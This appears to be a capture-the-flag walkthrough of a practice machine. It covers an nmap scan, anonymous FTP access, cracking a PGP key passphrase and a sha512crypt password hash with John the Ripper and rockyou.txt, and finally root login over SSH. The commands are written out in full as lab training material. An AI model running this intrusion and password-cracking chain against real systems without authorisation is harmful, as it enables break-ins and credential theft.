
---

# 📄 Penetration Test Walkthrough: Full Port Scan & Root Access via FTP, PGP, and SSH

## 🔍 1. Full Port Scan with Nmap

We start by scanning all ports on the target machine to identify open services:

```bash
nmap -v -A 0.0.0.0
```

**Result:**

- Port **21** (FTP) - **Anonymous login allowed**
- Port **22** (SSH) - Open

---

## 📂 2. Accessing FTP (Anonymous Login)

We connect to the FTP server using anonymous login:

```bash
ftp 0.0.0.0 -P 21
```

**Findings:**

- `user.txt` file available.
- `notread/` directory accessible.
- Found the following files:

```bash
get backup.pgp
get private.asc
```

---

## 🔐 3. Cracking PGP Key with John the Ripper

We need to crack the private PGP key to decrypt `backup.pgp`.

### Extract hash from PGP private key:

```bash
gpg2john private.asc >> hash.txt
```

### Run John the Ripper with `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:**  
We successfully recovered the PGP passphrase.

---

## 🔓 4. Decrypting the Backup File

Now that we have the PGP key password:

### Import the private key:

```bash
gpg --import private.asc
```

### Decrypt the backup file:

```bash
gpg --output backup.txt --decrypt backup.pgp
```

**Result:**  
`backup.txt` contains credentials that are hashed.

---

## 🔑 5. Cracking Credentials

We crack the password hash obtained from `backup.txt` using John the Ripper again:

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt backup.txt
```

**Result:**  
Password successfully cracked.

---

## 🔗 6. SSH Access & Root Flag

We now SSH into the machine using the cracked credentials:

```bash
ssh root@0.0.0.0
```

**Result:**  
We gain **root access** and retrieve the flag.

---

## ✅ Summary:

|Step|Status|
|---|---|
|Port Scan (Nmap)|✅ Completed|
|FTP Access|✅ Completed|
|Retrieved PGP Files|✅ Completed|
|Cracked PGP Key|✅ Completed|
|Decrypted Backup File|✅ Completed|
|Cracked Password Hash|✅ Completed|
|SSH Root Access|✅ Completed|
|Retrieved Flag|✅ Completed|

---